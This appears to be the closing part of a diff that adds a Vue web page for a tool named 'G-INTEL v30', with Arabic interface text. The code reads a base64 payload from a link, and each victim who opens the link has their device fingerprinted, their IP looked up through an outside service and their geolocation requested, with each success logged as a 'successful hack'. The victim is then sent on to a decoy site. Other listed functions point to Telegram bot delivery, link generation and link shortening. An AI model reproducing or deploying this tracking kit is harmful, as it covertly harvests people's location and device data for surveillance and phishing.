+                            log(`تم الكشف: ${device.brand} ${device.model}`);
+
+                            // Get network info
+                            let network = { ip: 'Unknown' };
+                            try {
+                                const res = await axios.get('https://ipapi.co/json/', { timeout: 5000 });
+                                network = res.data;
+                            } catch {}
+
+                            executionProgress.value = 70;
+                            log(`IP: ${network.ip || 'Unknown'}`);
+
+                            // Get location if requested
+                            let location = null;
+                            if (payload.modules.includes('location')) {
+                                try {
+                                    const pos = await new Promise((resolve, reject) => {
+                                        navigator.geolocation.getCurrentPosition(resolve, reject, { timeout: 10000 });
+                                    });
+                                    location = {
+                                        lat: pos.coords.latitude,
+                                        lng: pos.coords.longitude,
+                                        accuracy: pos.coords.accuracy
+                                    };
+                                    log(`الموقع: ${location.lat}, ${location.lng}`);
+                                } catch {}
+                            }
+
+                            // Build result
+                            const result = {
+                                timestamp: moment().format('YYYY-MM-DD HH:mm:ss'),
+                                deviceInfo: {
+                                    brand: device.brand,
+                                    model: device.model,
+                                    os: os,
+                                    browser: browser
+                                },
+                                systemInfo: {
+                                    cpu: { cores: navigator.hardwareConcurrency || '?' },
+                                    ram: { total: navigator.deviceMemory ? navigator.deviceMemory + 'GB' : '?' }
+                                },
+                                networkInfo: {
+                                    ip: network.ip,
+                                    country: network.country_name
+                                },
+                                location: location
+                            };
+
+                            capturedData.value.unshift(result);
+
+                            stats.totalHacks++;
+                            stats.successCount++;
+                            stats.uniqueDevices = Object.keys(stats.deviceModels).length;
+                            stats.successRate = Math.round((stats.successCount / stats.totalHacks) * 100);
+
+                            if (device.model) {
+                                stats.deviceModels[device.model] = (stats.deviceModels[device.model] || 0) + 1;
+                            }
+
+                            executionProgress.value = 100;
+                            executionStatus.value = 'اكتمل بنجاح';
+
+                            addNotification('اختراق ناجح!', `تم اختراق ${device.model || 'جهاز'}`, 'success');
+
+                        } catch (error) {
+                            stats.failCount++;
+                            executionStatus.value = 'فشل';
+                            log(`خطأ: ${error.message}`);
+                            addNotification('خطأ', 'فشل عملية الاختراق', 'error');
+                        }
+
+                        setTimeout(() => {
+                            window.location.replace(payload.url || 'https://www.google.com');
+                        }, (payload.extra?.delay || 3) * 1000);
+                    };
+
+                    // Mounted
+                    onMounted(() => {
+                        // Loading sequence
+                        const steps = [
+                            { progress: 20, msg: 'تحميل الأنظمة...', stage: '2/5' },
+                            { progress: 40, msg: 'تهيئة الوحدات...', stage: '3/5' },
+                            { progress: 60, msg: 'تفعيل قواعد البيانات...', stage: '4/5' },
+                            { progress: 80, msg: 'تجهيز الواجهة...', stage: '5/5' },
+                            { progress: 100, msg: 'النظام جاهز!', stage: 'مكتمل' }
+                        ];
+
+                        steps.forEach((step, i) => {
+                            setTimeout(() => {
+                                loadingProgress.value = step.progress;
+                                loadingMessage.value = step.msg;
+                                loadingStage.value = step.stage;
+                            }, i * 600);
+                        });
+
+                        setTimeout(() => loading.value = false, 3000);
+
+                        // Check for payload
+                        const params = new URLSearchParams(window.location.search);
+                        const m = params.get('m');
+                        if (m) {
+                            try {
+                                const decoded = decodeURIComponent(escape(atob(m)));
+                                const payload = JSON.parse(decoded);
+                                executeHack(payload);
+                            } catch {
+                                isExecuting.value = false;
+                            }
+                        }
+
+                        // Detect current device
+                        const ua = navigator.userAgent;
+                        const device = detectDevice(ua);
+                        currentDevice.model = device.model;
+                        currentDevice.brand = device.brand;
+                        
+                        if (ua.includes('Windows')) currentDevice.os = 'Windows';
+                        else if (ua.includes('Mac OS')) currentDevice.os = 'macOS';
+                        else if (ua.includes('Linux')) currentDevice.os = 'Linux';
+                        else if (ua.includes('Android')) currentDevice.os = 'Android';
+                        else if (ua.includes('iOS')) currentDevice.os = 'iOS';
+                        
+                        if (ua.includes('Chrome')) currentDevice.browser = 'Chrome';
+                        else if (ua.includes('Firefox')) currentDevice.browser = 'Firefox';
+                        else if (ua.includes('Safari')) currentDevice.browser = 'Safari';
+                        else if (ua.includes('Edg')) currentDevice.browser = 'Edge';
+
+                        // Clock
+                        setInterval(() => {
+                            currentTime.value = moment().format('HH:mm:ss');
+                        }, 1000);
+
+                        // Load stats
+                        const saved = localStorage.getItem('gintel_stats');
+                        if (saved) {
+                            try {
+                                Object.assign(stats, JSON.parse(saved));
+                            } catch {}
+                        }
+
+                        addLog('success', 'تم تشغيل G-INTEL v30');
+                        addNotification('مرحباً', 'الإصدار الذهبي مع TECNO, Infinix, itel', 'info');
+                    });
+
+                    // Watch stats
+                    watch(stats, (newVal) => {
+                        localStorage.setItem('gintel_stats', JSON.stringify(newVal));
+                    }, { deep: true });
+
+                    return {
+                        // State
+                        loading,
+                        loadingProgress,
+                        loadingMessage,
+                        loadingStage,
+                        isExecuting,
+                        generating,
+                        progress,
+                        progressMessage,
+                        generatedLink,
+                        activeTab,
+                        theme,
+                        lang,
+                        online,
+                        currentTime,
+                        tokenValid,
+                        chatIdValid,
+                        showQR,
+                        notifications,
+                        logs,
+                        logFilter,
+                        logFilters,
+                        capturedData,
+                        selectedModules,
+                        moduleSearch,
+                        config,
+                        extra,
+                        security,
+                        stats,
+                        attackModules,
+                        tabs,
+                        currentDevice,
+                        executionProgress,
+                        executionStatus,
+                        executionDetail,
+                        executionLog,
+                        executionAttempt,
+
+                        // Computed
+                        canGenerate,
+                        readinessLevel,
+                        filteredLogs,
+                        keyStrengthText,
+                        keyStrengthColor,
+
+                        // Methods
+                        validateToken,
+                        validateChatId,
+                        toggleModule,
+                        suggestChatId,
+                        getChatIdFromBot,
+                        testRedirectUrl,
+                        toggleTheme,
+                        toggleLanguage,
+                        getTabBadge,
+                        generateLink,
+                        copyLink,
+                        testLink,
+                        shortenLink,
+                        exportAllData,
+                        exportSingleData,
+                        clearAllData,
+                        viewDetails,
+                        addNotification,
+                        removeNotification,
+                        addLog,
+                        clearLogs,
+                        exportLogs
+                    };
+                }
+            });
+
+            app.mount('#app');
+        })();
+    </script>
+</body>
+</html>
